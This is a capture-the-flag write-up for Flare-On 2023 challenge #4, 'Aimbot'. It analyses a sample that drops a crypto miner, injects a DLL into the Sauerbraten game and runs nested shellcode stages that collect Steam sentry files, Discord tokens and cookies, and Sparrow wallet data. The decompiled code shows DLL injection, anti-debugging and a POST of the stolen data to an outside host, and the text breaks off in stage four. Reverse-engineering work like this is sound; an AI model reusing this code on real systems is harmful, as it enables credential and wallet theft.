## Flare-On 2023 - #4 Aimbot
___

### Description: 

*I hope this is the only aimbot on your system. Twitch streaming probably pays*
*better than being a mediocre reverse engineer though.*

`7-zip password: flare`
___

### Solution:

This challenge consists of **5** nested shellcodes; that is each shellcode decrypts and executes
the next shellcode.


When we run the program, shows a window with a single button:

![alt text](images/game1.png "")

We click it and nothing happens. If we follow `WinMain` we find the click button handler at
`0x402150` (`u_button_handle`):
```c
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
  HWND Window; // rax
  MSG Msg; // [rsp+60h] [rbp-A8h] BYREF
  WNDCLASSEXA v9; // [rsp+90h] [rbp-78h] BYREF

  v9.lpfnWndProc = (WNDPROC)u_wnd_proc;
  v9.hInstance = hInstance;
  v9.lpszClassName = ClassName;
  /* ... */
```

```c
LRESULT __fastcall u_wnd_proc(HWND hWndParent, UINT a2, WPARAM a3, HGDIOBJ a4) {
  /* ... */
  if ( a2 == 0x111 ) {
    if ( ho == a4 && (a3 & 0xFFFF0000) == 0 ) {
      ShowWindow(hWndParent, 0);
      u_button_handle();
      ExitProcess(0);
    }
    return 0i64;
  }
  /* ... */
}
```

The button handler does a lot of interesting things. First of all it checks the MD5 digest of the 
`sauerbraten.exe` file which is supposed to be on the system (as we will see this check is
critical because the program reads from specific locations from memory):
```c
void u_button_handle() {
  u_unknown();
  strcpy(v52, "%PROGRAMFILES(X86)%\\Sauerbraten\\bin64\\sauerbraten.exe");
  ExpandEnvironmentStringsA(v52, filename, 0x400u);
  ExpandEnvironmentStringsA("%PROGRAMFILES(X86)%\\Sauerbraten", v59, 0x400u);
  fileHdl = CreateFileA(filename, 0x80000000, 1u, 0i64, 3u, 0x80u, 0i64);
  fileHdl_ = fileHdl;
  if ( fileHdl != (HANDLE)-1i64 )
  {
    if ( !GetFileSizeEx(fileHdl, &v49)
      || (LowPart = v49.LowPart, v3 = (char *)malloc(v49.QuadPart), (fileContents = v3) == 0i64) )
    {
      CloseHandle(fileHdl_);
      return;
    }
    if ( !ReadFile(fileHdl_, v3, LowPart, &len, 0i64) )
    {
      CloseHandle(fileHdl_);
      free(fileContents);
      return;
    }
    CloseHandle(fileHdl_);
    u_md5_init(digest);
    u_md5_update(digest, fileContents, len);
    u_md5_final(digest);
    if ( v55 == 0xD7C6F08CA0220B18ui64 && v56 == 0x2DBF0B17FFA57A6Ci64 )
    {
```

If the digest matches, program extracts **3** files from the PE resources, it decrypts them
(using Rijndael in ECB mode and key `yummyvitamincjoy`) and drops them under `%APPDATA%\\BananaBot`
directory. These files are `miner.exe`, `config.json` and `aimbot.dll`.
```c
      free(fileContents);
      memset(base_dir, 0, sizeof(base_dir));
      ExpandEnvironmentStringsA("%APPDATA%\\BananaBot", base_dir, 0x400u);
      v5 = base_dir;
      /* ... */
      CreateDirectoryA(base_dir, 0i64);
      strcpy(miner_exe, base_dir);
      strcpy(config_json, base_dir);
      strcpy(aimbot_dll, base_dir);
      strcat(miner_exe, "\\miner.exe");
      strcat(config_json, "\\config.json");
      strcat(aimbot_dll, "\\aimbot.dll");
      FileA = CreateFileA(miner_exe, 0x40000000u, 0, 0i64, 2u, 0x80u, 0i64);
      if ( FileA != (HANDLE)-1i64 ) {
        ModuleHandleA = GetModuleHandleA(0i64);
        ResourceA = FindResourceA(ModuleHandleA, (LPCSTR)1, (LPCSTR)0xA);
        if ( !ResourceA )
          goto TEARDOWN;
        v45 = ResourceA;
        encr_buflen = SizeofResource(ModuleHandleA, ResourceA);
        if ( !encr_buflen )
          goto TEARDOWN;
        Resource = LoadResource(ModuleHandleA, v45);
        if ( !Resource )
          goto TEARDOWN;
        encr_buf = LockResource(Resource);
        v13 = u_decrypt_buf_with_rijndael(encr_buf, encr_buflen);
        v42 = encr_buflen - 42;
        v14 = WriteFile(FileA, v13 + 42, v42, &v47, 0i64);
        v15 = FileA;
        if ( !v14 || v42 != v47 )
          goto LABEL_19;
        CloseHandle(FileA);
```

The config file is being dropped:
```c
        FileA = CreateFileA(config_json, 0x40000000u, 0, 0i64, 2u, 0x80u, 0i64);
        if ( FileA != (HANDLE)-1i64 ) {
          v16 = ((__int64 (__fastcall *)(HMODULE, __int64, __int64))FindResourceA)(ModuleHandleA, 2i64, 10i64);
          if ( v16 ) {
            v43 = v16;
            v38 = ((__int64 (__fastcall *)(HMODULE, __int64))SizeofResource)(ModuleHandleA, v16);
            if ( v38 ) {
              v17 = ((__int64 (__fastcall *)(HMODULE, __int64))LoadResource)(ModuleHandleA, v43);
              if ( v17 ) {
                v18 = (void *)((__int64 (__fastcall *)(__int64))LockResource)(v17);
                v19 = u_decrypt_buf_with_rijndael(v18, v38);
                v39 = v38 - 50;
                v20 = ((__int64 (__fastcall *)(HANDLE, char *, _QWORD, DWORD *, _QWORD))WriteFile)(
                        FileA,
                        v19 + 42,
                        v39,
                        &v47,
                        0i64);
                v15 = FileA;
                if ( !v20 || v39 != v47 ) {
                  CloseHandle(v15);
                  return;
                }
                CloseHandle(FileA);
                /* ... */
```

The `miner.exe` process is being launched:
```c
                if ( !CreateProcessA(miner_exe, 0i64, 0i64, 0i64, 0, 0, 0i64, base_dir, &v57, &v50) ) {
                  TerminateProcess(v50.hProcess, 0);
                  v34 = 12i64;
                  v33 = &v53;
                  v35 = 0;
                  goto LABEL_45;
                }
                if ( !u_connect_to_bananabot() ) {
                  TerminateProcess(v50.hProcess, 0);
                  return;
                }
```

Finally the `aimbot.dll` is decrypted and injected into `sauerbraten.exe`:
```c
                v25 = CreateFileA(aimbot_dll, 0x40000000u, 0, 0i64, 2u, 0x80u, 0i64);
                if ( v25 == (HANDLE)-1i64 )
                  goto TEARDOWN_2;
                v26 = ((__int64 (__fastcall *)(HMODULE, __int64, __int64))FindResourceA)(ModuleHandleA, 3i64, 10i64);
                if ( v26 ) {
                  v44 = v26;
                  v27 = ((__int64 (__fastcall *)(HMODULE, __int64))SizeofResource)(ModuleHandleA, v26);
                  if ( !v27 ) {
                    CloseHandle(v25);
                    goto LABEL_51;
                  }
                  v28 = ((__int64 (__fastcall *)(HMODULE, __int64))LoadResource)(ModuleHandleA, v44);
                  if ( v28 ) {
                    v29 = (void *)((__int64 (__fastcall *)(__int64))LockResource)(v28);
                    v30 = v27;
                    v31 = v27 - 42;
                    v32 = u_decrypt_buf_with_rijndael(v29, v30);
                    if ( !(unsigned int)((__int64 (__fastcall *)(HANDLE, char *, _QWORD, DWORD *, _QWORD))WriteFile)(
                                          v25,
                                          v32 + 42,
                                          v31,
                                          &v47,
                                          0i64)
                      || v31 != v47 ) {
                      CloseHandle(v25);
TEARDOWN_2:
                      TerminateProcess(v50.hProcess, 0);
                      /* ... */                      
                    }
                    /* ... */
                    if ( !CreateProcessA(filename, 0i64, 0i64, 0i64, 0, 0, 0i64, v59, &v57, &v51) )
                      return;
                    Sleep(0x1388u);
                    v27 = u_create_remote_thread_for_dll(v51.hProcess, aimbot_dll);
                    /* ... */
```

We also have some helpder functions. Rijndael is statically linked, but we can easily infer
the algorithm from the Sbox and round constants:
```c
char *__fastcall u_decrypt_buf_with_rijndael(void *Src, size_t Size) {
  char *buf; // rbp
  char *v5; // rbx
  size_t v6; // rdi
  __int64 v7; // rdx
  char v9[232]; // [rsp+20h] [rbp-E8h] BYREF

  buf = (char *)malloc(Size);
  memcpy(buf, Src, Size);
  j_u_rijndael_key_sched(v9, "yummyvitamincjoy");
  if ( Size ) {
    v5 = buf;
    v6 = (size_t)&buf[((Size - 1) & 0xFFFFFFFFFFFFFFF0ui64) + 16];
    do {
      v7 = (__int64)v5;
      v5 += 16;
      j_u_rijndael_decrypt((__int64)v9, v7);
    } while ( v5 != (char *)v6 );
  }
  return buf;
}
```

Then we have the DLL injection using `CreateRemoteThread`:
```c
_BOOL8 __fastcall u_create_remote_thread_for_dll(HANDLE hProcess, char *Str) {
  /* ... */
  v4 = strlen(Str);
  v5 = VirtualAllocEx(hProcess, 0i64, v4, 0x3000u, 0x40u);
  if ( v5
    && (v6 = strlen(Str), WriteProcessMemory(hProcess, v5, Str, v6, 0i64))
    && (ModuleHandleA = GetModuleHandleA("kernel32.dll"),
        (ProcAddress = (DWORD (__stdcall *)(LPVOID))GetProcAddress(ModuleHandleA, "LoadLibraryA")) != 0i64) ) {
    return CreateRemoteThread(hProcess, 0i64, 0i64, ProcAddress, v5, 0, 0i64) != 0i64;
  } else {
    return 0i64;
  }
}
```

Finally we have the health check on `miner.exe`:
```c
void *u_connect_to_bananabot() {
  /* ... */
  v0 = malloc(0x4000ui64);
  v1 = InternetOpenA("bananabot 5000", 1u, 0i64, 0i64, 0);
  v2 = v1;
  if ( !v1 )
    return 0i64;
  v3 = InternetOpenUrlA(v1, "http://127.0.0.1:57328/2/summary", 0i64, 0, 0x80000000, 0i64);
  if ( v3 ) {
    while ( InternetReadFile(v3, v0, 0x4000u, dwNumberOfBytesRead) && dwNumberOfBytesRead[0] )
      ;
    InternetCloseHandle(v3);
    InternetCloseHandle(v2);
  } else {
    v0 = 0i64;
    InternetCloseHandle(v2);
  }

  return v0;
}
```

The [aimbot_resource_decryptor.py](./aimbot_resource_decryptor.py) script decrypts all resources.

#### Reversing the DLL

The `aimbot.dll` creates **3** threads, however only one is interested to us:
```c
BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
  if ( fdwReason == 1 ) {
    DisableThreadLibraryCalls(hinstDLL);
    CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)u_thread_routine_A, hinstDLL, 0, 0i64);
    CreateThread(0i64, 0i64, u_thread_routine_B_drop_shellcode, 0i64, 0, 0i64);
    CreateThread(0i64, 0i64, u_thread_routine_C_ANTIDEBUG, 0i64, 0, 0i64);
  }
  return 1;
}
```

Thread `u_thread_routine_B_drop_shellcode` at `062F43070h` decrypts (using Rijndael in ECB mode)
and executes the **stage #1 shellcode** which is located at `062FE7340`:
```
.rdata:062FE7340    glo_encr_shellcode db 0A8h, 3Bh, 15h, 47h, 7Eh, 0D2h, 99h, 0BCh, 5, 9Dh, 0C5h, 87h
```

```c
__int64 __fastcall u_thread_routine_B_drop_shellcode(LPVOID lpThreadParameter) {
  /* ... */
  GetLocalTime(&SystemTime);
  Sleep(0x2BF20u);
  GetLocalTime(&v14);
  if ( SystemTimeToFileTime(&SystemTime, &FileTime)
    && SystemTimeToFileTime(&v14, &v12)
    && *(_QWORD *)&v12 - *(_QWORD *)&FileTime > 0x6B49D1FFui64
    && (CreateDirectoryA("C:\\depot", 0i64) || GetLastError() == 183) ) {
    // "version": "6.20.0",
    // "kind": "miner",
    // "ua": "XMRig/6.20.0 (Windows NT 6.1; Win64; x64) libuv/1.44.2 gcc/11.2.0",
    summary_file = (char *)u_fetch_summary_file();
    if ( summary_file ) {
      xor_key = u_create_str_decr_key_w_ANTIDEBUG();
      aes_key = u_decrypt_str(2, 16, xor_key);  // "version": "
      rijndael_key = strstr(summary_file, aes_key);
      if ( rijndael_key ) {
        buf = (char *)VirtualAlloc(0i64, 0x4470ui64, 0x1000u, 0x40u);
        memcpy(buf, &glo_encr_shellcode, 0x4470ui64);
        j_u_j_rijndael_key_sched(rijndael, rijndael_key);
        free(summary_file);
        if ( glo_const_thread_B_run_once ) {
          v7 = 0i64;
          do {
            v8 = &buf[v7];
            v7 += 16i64;
            u_j_rijndael_decrypt(rijndael, v8);
          } while ( glo_const_thread_B_run_once > v7 );
        }
        v9 = u_create_str_decr_key_w_ANTIDEBUG();
        v10 = u_decrypt_str(3, 44, v9);         // the decryption of this blob was successful
        if ( !memcmp(buf, v10, 0x2Aui64) ) {
          v15[0] = 0i64;
          v15[1] = 0i64;
          // len('the decryption of this blob was successful') = 42
          ((void (__fastcall *)(__int64 *))(buf + 42))(v15);// next layer
        }
      }
    }
  }
  return 0i64;
}
```

Function `u_fetch_summary_file` gets the contents of `miner.exe` summary file:
```c
char *__fastcall u_fetch_summary_file() {
  /* ... */
  contents = malloc(0x4000ui64);
  key1 = u_create_str_decr_key_w_ANTIDEBUG();
  v2 = u_decrypt_str(1, 16, key1);              // bananabot 5000
  v3 = InternetOpenA(v2, 1u, 0i64, 0i64, 0);
  if ( !v3 )
    return 0i64;
  key2 = u_create_str_decr_key_w_ANTIDEBUG();
  v5 = u_decrypt_str(0, 36, key2);              // http://127.0.0.1:57328/2/summary
  v6 = InternetOpenUrlA(v3, v5, 0i64, 0, 0x80000000, 0i64);
  if ( v6 ) {
    while ( InternetReadFile(v6, contents, 0x4000u, (LPDWORD)dwNumberOfBytesRead) && dwNumberOfBytesRead[0] )
      ;
    InternetCloseHandle(v6);
    InternetCloseHandle(v3);
  } else {
    contents = 0i64;
    InternetCloseHandle(v3);
  }
  return (char *)contents;
}
```

Then we have the string decryption. Each string is encrypted with the following algorithm:
```c
_BYTE *__fastcall u_decrypt_str(int a1_idx, int a2_len, int a3_key) {
  /* ... */
  v3 = a1_idx;
  if ( a1_idx > 3 || !a3_key )
    return 0i64;
  decr = (DWORD *)malloc(a2_len);
  string = (DWORD *)*(&glo_encr_str_tbl + v3);
  if ( a2_len > 3 ) {
    i = 0i64;
    do {
      decr[i] = a3_key ^ string[i];
      ++i;
    } while ( a2_len / 4 > (int)i );
  }
  return decr;
}
```

The decryption key comes from the following function:
```c
__int64 u_create_str_decr_key_w_ANTIDEBUG() {
  /* ... */
  if ( IsDebuggerPresent() )
    return 0i64;
  CurrentProcess = GetCurrentProcess();
  if ( CheckRemoteDebuggerPresent(CurrentProcess, &pbDebuggerPresent) && pbDebuggerPresent )
    return 0i64;
  else
    return u_create_str_decr_key();
}
```

```c
__int64 u_create_str_decr_key() {
  /* ... */
  LibraryA = LoadLibraryA("ntdll.dll");
  if ( LibraryA ) {
    NtQueryInformationProcess = GetProcAddress(LibraryA, "NtQueryInformationProcess");
    if ( NtQueryInformationProcess ) {
      procIDs[0] = 0i64;
      CurrentProcess = GetCurrentProcess();
      if ( ((int (__fastcall *)(HANDLE, __int64, _QWORD *, __int64, _BYTE *))NtQueryInformationProcess)(
             CurrentProcess,
             30i64,
             procIDs,
             8i64,
             processName) >= 0 ) {
        if ( procIDs[0] )
          return 0i64;
      }
    }
  }
  if ( NtCurrentPeb()->BeingDebugged )
    return 0i64;
  nxt_procID = (DWORD *)procIDs;
  *(_QWORD *)hashes = 0x3755DCD46855AF94i64;
  *(_QWORD *)&hashes[2] = 0xF255062FB2C6B4E9ui64;
  *(_QWORD *)&hashes[8] = 0x3755DCD46855AF94i64;
  *(_QWORD *)&hashes[4] = 0x374755BE5E620917i64;
  *(_QWORD *)&hashes[10] = 0xF255062FB2C6B4E9ui64;
  *(_QWORD *)&hashes[12] = 0x374755BE5E620917i64;
  *(_QWORD *)&hashes[14] = 0x3A083D2B843E42CCi64;
  *(_QWORD *)&hashes[6] = 0x3A083D2B843E42CCi64;
  if ( !(unsigned int)((__int64 (__fastcall *)(_QWORD *, __int64, unsigned int *))EnumProcesses)(
                        procIDs,
                        0x1000i64,
                        &nprocs) )
    return 0i64;
  if ( nprocs >> 2 ) {
    hashes_found = 0;
    OpenProcess = ::OpenProcess;
    last_procID = (DWORD *)procIDs + (nprocs >> 2);
    do {                                        // for every proc in the system
      proc_hdl = ::OpenProcess(0x410u, 0, *nxt_procID);
      proc_hdl_ = proc_hdl;
      if ( proc_hdl ) {
        if ( (unsigned int)((__int64 (__fastcall *)(HANDLE, _QWORD, _BYTE *, __int64))GetModuleBaseNameA)(
                             proc_hdl,
                             0i64,
                             processName,
                             260i64) ) {
          chr = processName[0];
          processNameLower = processName;
          if ( !processName[0] )
            goto EMPTY_PROC_NAME;
          do {                                   // cast to lowercase
            *processNameLower++ = tolower(chr);
            chr = (char)*processNameLower;
          } while ( *processNameLower );
          chr_ = processName[0];
          if ( processName[0] ) {
            chksum = 0;
            v13 = processName;
            do {                                 // Calculate checksum of the process name
              ++v13;
              v14 = __ROR4__(chksum, 13);
              v15 = chr_;
              chr_ = *v13;
              chksum = v14 ^ v15;
            } while ( *v13 );
          } else {
EMPTY_PROC_NAME:
            chksum = 0;
          }
          j = 0i64;
          while ( hashes[j] != chksum ) {
            if ( ++j == 8 )
              goto END_OF_HASH_TBL;             // reach end of tbl without finding it
          }
          ++hashes_found;
          hashes[j] = 0;                        // make sure we won't match it again
        }
END_OF_HASH_TBL:
        CloseHandle(proc_hdl_);
      }
      ++nxt_procID;
    } while ( nxt_procID != last_procID );
    keyA = hashes_found + 0x1337;               // this should be: 0x1337 + 8
  } else {
    keyA = 0x1337;
    OpenProcess = ::OpenProcess;
  }
  CurrentProcessId = GetCurrentProcessId();
  parentProcID = u_find_parent_proc_ID(CurrentProcessId);
  parent_proc = OpenProcess(0x1F0FFFu, 0, parentProcID);
  // .rdata:0000000000406220 ; const CHAR szAgent[]
  // .rdata:0000000000406220 szAgent         db 'bananabot 5000',0   ; DATA XREF: sub_401DA0+2A↑o
  // keyB = 0x616E6162
  if ( !parent_proc || !ReadProcessMemory(parent_proc, (LPCVOID)0x406220, &keyB, 4ui64, &v25) )
    return 0i64;
  keyC = keyB + keyA;
  // module_base + 0x13E8 = 0x32b8408
  // We need to have the exact version of sauerbraten.exe based on the MD5 digest in aimbot.exe
  return (unsigned int)(*((_DWORD *)GetModuleHandleA(0i64) + 0x13E8) + keyC);
}
```

To compute the string decryption key, program checks if **8** specific processes are running on the
system (we know which ones since function uses the checksums of their names to compare). If all of
them found the number **8** is added to the key which is initialized to `0x1337`. Then program adds
the contents of the address `0x406220` of the parent process (`aimbot.exe`), which are `bana` and
the contents of the address `module_base + 0x13E8` of the current process (`sauerbraten.exe`).

However, we need a specific version of `sauerbraten.exe` (recall that `aimbot.exe` checks the MD5
digest of this binary). so we have to bruteforce it and see which number yields to printable
ASCII strings:
```python
def crack_keyC():
    keyA = 0x1337 + 8
    keyB = 0x616E6162    
    for keyC in range(0, 0x7FFFFFFF):
        keyC = 0x32b8408
        key = (keyA + keyB + keyC) & 0xFFFFFFFF
        
        decr = []
        for i in range(0, len(s1), 4):
            l = list_2_dword(s1[i:i+4])
            decr += dword_2_list(l ^ key)

        decr = ''.join(chr(x) for x in decr)
        if decr[:16].isprintable():
            print(f'[+] KeyC found: {keyC:08X}')
            return keyC

    raise Exception('KeyC not found :(')
```

The correct `keyC` is `32B8408h` and the correct `key` is `6499F8A9h`. Now we can decrypt
the **4** encrypted strings in the DLL:
```
Index #0 ~> 'http://127.0.0.1:57328/2/summary\x00\x03\x03\x03'
Index #1 ~> 'bananabot 5000\x00\x01'
Index #2 ~> '"version": "\x00\x03\x03\x03'
Index #3 ~> 'the decryption of this blob was successful\x00\x01'
```

Going back to `u_thread_routine_B_drop_shellcode` we can now see how the shellcode is being
decrypted. Program searches on the *summary* file of `miner.exe` for the `"version": "` string
and uses **16** bytes from it as the Rijndael key. We open the summary file and we get the key:
`"version": "6.20`. Now we can decrypt the shellcode and move on.


#### Reversing Stage #1 Shellcode

The purpose of this shellcode is to decrypt and run a nested shellcode.
```c
void u_entry_point() {
  /* ... */
  u_decrypt_string(glo_encr_str, &v4);
  glo_shellcode_stage2_size = 15129;
  glo_shellcode_stage2_ptr = glo_shellcode_stage2;
  LOBYTE(v0) = u_decrypt_n_run_shellcode();
  (glo_func_tbl[2])(v0); 
}
```

This shellcode uses **RC4** to do the decryption. The key comes from the **config.vdf** file of the
**Steam** program (which has to be installed on the system)
```c
bool __fastcall u_decrypt_n_run_shellcode() {
  /* ... */
  hdl = u_OpenFile_maybe("C:\\Program Files (x86)\\Steam\\config\\config.vdf", 0x80000000);
  hdl_ = hdl;
  if ( hdl < 0 )
    return 0;
  size = (glo_func_tbl[3])(hdl, 0i64);
  size_ = size;
  if ( !size )
    return 0;
  buf = u_alloc_maybe(size);
  nread = u_ReadFile_maybe(hdl_, buf, size_);
  u_close_maybe(hdl_);
  if ( nread != size_ )
    return 0;
  // Example:
  //     "SentryFile" "C:\\Program Files (x86)\\Steam\\ssfn5815554495665143805"
  SentryFile = u_strstr(buf, "\"SentryFile\"");
  if ( !SentryFile )
    return 0;
  key_begin = u_strchr(SentryFile + 12, '"');
  if ( !key_begin )
    return 0;
  key_begin_p1 = key_begin + 1;                 // +1 to skip space
  key_end = u_strchr(key_begin + 1, '"');
  if ( !key_end )
    return 0;
  key_len = key_end - key_begin_p1;
  rc4_key = u_alloc_maybe(key_end - key_begin_p1 + 1);
  qmemcpy(rc4_key, key_begin_p1, key_len);
  rc4_key[key_len] = 0;
  if ( !(glo_func_tbl[6])(rc4_key, "C:\\depot\\steam_ssfn", 0i64) )
    return 0;
  // LOOK AT THE ASM TO SEE WHERE key is initialized
  // https://gist.github.com/Velaxtor/4695312
  u_rc4_key_sched(S, real_rc4_key, 0x10ui64);   // key len: 16 bytes
  u_rc4_crypt(S, glo_shellcode_stage2_ptr, glo_shellcode_stage2_size);
  if ( !u_memcmp(glo_shellcode_stage2_ptr, "the decryption of this blob was successful", 0x2Aui64) )
    __asm { jmp     rax }
  sub_59F(buf);
  return 1;
}
```

The `real_rc4_key` looks uninitialized, so we have to look at the assembly:
```assembly
seg000:000000000000068A loc_68A:                                ; CODE XREF: u_decrypt_n_run_shellcode+59↑j
seg000:000000000000068A         movsxd  rcx, esi
seg000:000000000000068D         call    u_alloc_maybe
seg000:0000000000000692         mov     rbx, rax
seg000:0000000000000695         movsxd  r8, esi
seg000:0000000000000698         mov     ecx, edi
seg000:000000000000069A         mov     rdx, rbx
seg000:000000000000069D         call    u_ReadFile_maybe
; ....
seg000:00000000000006BD loc_6BD:                                ; CODE XREF: u_decrypt_n_run_shellcode+8C↑j
seg000:00000000000006BD         lea     rax, aSentryfile        ; "\"SentryFile\""
seg000:00000000000006C4         lea     rdx, [rax]
seg000:00000000000006C7         mov     rcx, rbx
seg000:00000000000006CA         call    u_strstr
; ....
seg000:0000000000000786 loc_786:                                ; CODE XREF: u_decrypt_n_run_shellcode+155↑j
seg000:0000000000000786         lea     rdi, [rbp+real_rc4_key]
seg000:000000000000078D         mov     rsi, rbx                ; rbx = key = buf!
seg000:0000000000000790         push    10h
seg000:0000000000000792         pop     rcx
seg000:0000000000000793         rep movsb
seg000:0000000000000795         lea     rcx, [rbp+S]            ; a1
seg000:000000000000079C         lea     rdx, [rbp+real_rc4_key] ; a2
seg000:00000000000007A3         push    10h
seg000:00000000000007A5         pop     r8                      ; a3
seg000:00000000000007A7         call    u_rc4_key_sched
```

`rbx` contains the address of `buf` which contains the contents of `config.vdf`. That is
the **RC4** key is the first **16** bytes of the contents of `config.vdf`. We can see from
[here](https://gist.github.com/Velaxtor/4695312) that this file starts as `"InstallConfigStore" {`.
To verify that decryption was successful. Each shellcode starts with the string
`the decryption of this blob was successful`.


#### Reversing Stage #2 Shellcode

This shellcode has the same layout:
```c
// write access to const memory has been detected, the output may be wrong!
// positive sp value has been detected, the output may be wrong!
void __fastcall u_entry_point() {
  /* ... */
  u_decrypt_string(glo_encr_str, &v4);
  glo_shellcode_stage3_size = 11176;
  glo_shellcode_stage3_ptr = glo_shellcode_stage3;
  v0 = u_decrypt_n_run_shellcode();  
}
```

```c
__int64 u_decrypt_n_run_shellcode() {
  /* ... */
  file_found = 0;
  (glo_func_tbl[10])("%APPDATA%\\Discord\\Local Storage\\leveldb", v10, 256i64);
  u_sprintf(leveldb, "%s\\*.ldb", v1);
  v2 = (glo_func_tbl[4])(leveldb, v12);
  if ( v2 == -1 )
    return 0i64;
  do
  {
    u_sprintf(a1, "%s\\%s", v10, v3);
    if ( u_find_str_in_file(a1, "dQw4w9WgXcQ") )
    {
      u_sprintf(v14, "%s\\%s", v5, v6);
      (glo_func_tbl[9])(a1, v14, 0i64);
      ++file_found;
    }
  }
  while ( (glo_func_tbl[5])(v2, v12) );
  glo_func_tbl[3](v2);
  if ( file_found <= 0 )
    return 0i64;
  (glo_func_tbl[10])("%APPDATA%\\Discord\\Network\\Cookies", cookies, 256i64);
  hdl = u_OpenFile_maybe(cookies, 0x80000000);
  hdl_ = hdl;
  if ( hdl >= 0 )
  {
    u_ReadFile_maybe(hdl, key, 16i64);
    u_CloseHandle_maybe(hdl_);
    u_rc4_key_sched(S, key, 0x10ui64);
    u_rc4_crypt(S, glo_shellcode_stage3_ptr, glo_shellcode_stage3_size);
    LOBYTE(v9) = u_memcmp(glo_shellcode_stage3_ptr, "the decryption of this blob was successful", 0x2Aui64);
    if ( !v9 )
      __asm { jmp     rax }
    return 0i64;
  }
  return 0i64;
}
```

This is the exact as before, however this time we use the first **16** bytes of the `leveldb`
file which are `SQLite format 3\x00` as the **RC4** key (this time we don't have to look in the
assembly to see how the `key` is initialized).

#### Reversing Stage #3 Shellcode

The **stage #3** shellocde is also the same:
```c
void __fastcall __noreturn u_entry_point() {
  /* ... */
  (u_decrypt_string)(glo_encr_str, &v0);
  glo_shellcode_stage4_size = 7116;
  *&glo_shellcode_stage4_ptr = glo_shellcode_stage4;
  u_decrypt_n_run_shellcode();
}
```

```c
void __fastcall __noreturn u_decrypt_n_run_shellcode() {
  /* ... */
  v0 = 0;
  (qword_EB2[10])("%APPDATA%\\Sparrow\\wallets", v15, 256i64);
  u_sprintf(v16, "%s\\*.db", v1);
  v2 = (qword_EB2[4])(v16, v17);
  if ( v2 != -1 ) {
    do {
      u_sprintf(v20, "%s\\%s", v15, v3);
      u_sprintf(v21, "%s\\%s", v4, v5);
      (qword_EB2[9])(v20, v21, 0i64);
      ++v0;
      sub_77F(keyword, v18);
    } while ( (qword_EB2[5])(v2, v17) );
    qword_EB2[3](v2);
    if ( v0 > 0 ) {
      (qword_EB2[10])("%APPDATA%\\Sparrow\\config", name, 256i64);
      hdl = u_OpenFile_maybe(name, 0x80000000);
      hdl_ = hdl;
      if ( hdl ) {
        size = (qword_EB2[6])(hdl, 0i64);
        size_ = size;
        if ( size ) {
          buf = u_alloc_maybe(size);
          u_ReadFile_maybe(hdl_, buf, size_);
          end = u_strstr(buf, keyword);
          if ( end ) {
            first_bracket = u_backward_strchr(end, '[', buf);
            if ( first_bracket ) {
              first_dquote = u_backward_strchr(first_bracket, '"', buf);
              if ( first_dquote ) {
                key = u_backward_strchr(first_dquote - 1, '"', buf);
                if ( key ) {
                  u_rc4_key_sched(S, key + 1, 0x11ui64);
                  u_rc4_crypt(S, *&glo_shellcode_stage4_ptr, glo_shellcode_stage4_size);
                  if ( !u_memcmp(*&glo_shellcode_stage4_ptr, "the decryption of this blob was successful", 0x2Aui64) )
                    __asm { jmp     rax }
                  u_close_maybe(hdl_);
                  u_free(buf);
                }
              }
            }
          }
        }
      }
    }
  }
}
```

This time, The **RC4** key comes from the Sparrow's `config` file, where shellcode searches for the 
`[` and `"` characters. This is how a `config` file looks like:
```
{
  "mode": "OFFLINE",
  "bitcoinUnit": "BTC",
  ...
  "preventSleep": false,
  "recentWalletFiles": [
    "/home/ispo/.sparrow/wallets/ispo_wallet.mv.db"
  ],
  "dustAttackThreshold": 1000,
  "hwi": "/tmp/hwi-2.3.114708156898038994654.tmp",
  ...
  "appWidth": 2558.0,
  "appHeight": 1421.0
}
```

The only value that contains `[]` is the `recentWalletFiles`. Shellcode searches backwards from
the `[` to the first `"` (which is `"recentWalletFiles"`) and the searches backwards again for the 
first quote, so the key is also `recentWalletFiles` (this time is **17** bytes).


#### Reversing Stage #4 Shellcode

The **stage #4** shellcode is slightly different:
```c
void __fastcall __noreturn u_entry_point() {
  /*... */
  (u_decrypt_string)(glo_encr_str, &v0);
  glo_shellcode_stage5_size = 3496;
  glo_shellcode_stage5_ptr = glo_shellcode_stage5;
  u_decrypt_n_run_shellcode();
}
```

```c
void __fastcall __noreturn u_decrypt_n_run_shellcode() {
  /* ... */
  sub_4C7("C:\\depot", "C:\\depot\\output");
  hdl = u_OpenFile("C:\\depot\\output", 0x80000000);
  hdl_ = hdl;
  if ( hdl >= 0 ) {
    size = (qword_C81[6])(hdl, 0i64);
    size_ = size;
    if ( size ) {
      buf = u_alloc(size);
      nread = u_ReadFile(hdl_, buf, size_);
      u_CloseHandle(hdl_);
      if ( nread == size_ ){
        v6 = (qword_CE1[5])("bananabot 5000", 1i64, 0i64, 0i64, 0i64, "bananabot 5000");
        v8 = v6;
        if ( v6 ) {
          port = 443;
          v9 = (qword_CE1)[4](v6, "bighackies.flare-on.com", *&port, 0i64, 0i64, 3i64, 0i64, 0i64);
          v10 = v9;
          if ( v9 ) {
            v11 = (*aTheDecryptionO)(v9, "POST", "/stolen", 0i64, 0i64, 0i64, 0x800000i64, 0i64);
            v12 = v11;
            if ( v11 ) {
              v13 = (qword_CE1[2])(
                      v11,
                      "Content-Type: application/octet-stream\r\n",
                      0xFFFFFFFFi64,
                      buf,
                      size_,
                      "Content-Type: application/octet-stream\r\n");
              if ( v13 ) {
                secret = 0;
                v22 = 4;
                if ( (qword_CE1[1])(v12, 0x20000005i64, &secret, &v22, 0i64, v13) ) {
                  v23 = 0;
                  buf2 = u_alloc(1024i64);
                  while ( (qword_CE1[6])(v12, buf2, 7i64, &v23) ) {
                    if ( !v23 ) {
                      (qword_CE1[3])(v12);
                      (qword_CE1[3])(v10);
                      (qword_CE1[3])(v8);
                      v15 = sub_B2(buf, size_);
                      v16 = sub_B2(buf + 1, (size_ - 1));
                      v17 = sub_B2(buf + 2, (size_ - 2));
                      v18 = sub_B2(buf + 3, (size_ - 3));
                      if ( v15 == *buf2 && v16 == buf2[1] && v17 == buf2[2] && v18 == buf2[3] ) {
                        u_free(buf);
                        u_free(buf2);
                        key = 0x1234567 * secret;
                        for ( i = 0; i < glo_shellcode_stage5_size / 4; ++i )
                          glo_shellcode_stage5_ptr[i] ^= key;
                        if ( !u_memcmp(glo_shellcode_stage5_ptr, "the decryption of this blob was successful", 0x2Aui64) )
                          __asm { jmp     rax }
                      }
                      return;
